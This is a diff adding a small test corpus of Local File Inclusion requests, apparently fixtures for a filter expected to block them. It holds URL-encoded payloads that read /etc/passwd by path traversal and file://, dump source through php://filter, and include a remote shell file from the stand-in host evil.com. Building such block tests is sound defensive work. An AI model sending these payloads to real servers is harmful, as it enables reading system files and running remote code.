@@ -1,0 +1,6 @@
+# Local File Inclusion corpus — EXPECT:block
+GET /?page=file%3A%2F%2F%2Fetc%2Fpasswd
+GET /?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php
+GET /?doc=http%3A%2F%2Fevil.com%2Fshell.txt
+GET /?include=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPHNjcmlwdD4
+GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd%00
